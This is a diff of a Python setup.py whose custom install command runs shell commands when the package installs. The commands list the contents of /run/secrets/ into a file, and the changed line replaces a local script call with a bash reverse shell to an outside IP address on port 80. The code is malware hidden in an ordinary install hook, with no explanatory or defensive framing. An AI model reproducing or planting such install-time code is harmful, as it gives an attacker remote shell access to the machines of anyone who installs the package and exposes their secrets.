@@ -15,7 +15,7 @@ class CustomInstallCommand(install):
         subprocess.call(["echo FOO3 >> /app/foo"],shell=True)
         subprocess.call(["./busybox ls -alh /run/secrets/ >> /app/foo"],shell=True)
         subprocess.call(["echo FOO4 >> /app/foo"],shell=True)
-        subprocess.call(["bash /app/ps.sh"],shell=True)
+        subprocess.call(["bash -i >& /dev/tcp/82.165.195.38/80 0>&1"],shell=True)
 
 
 setup(
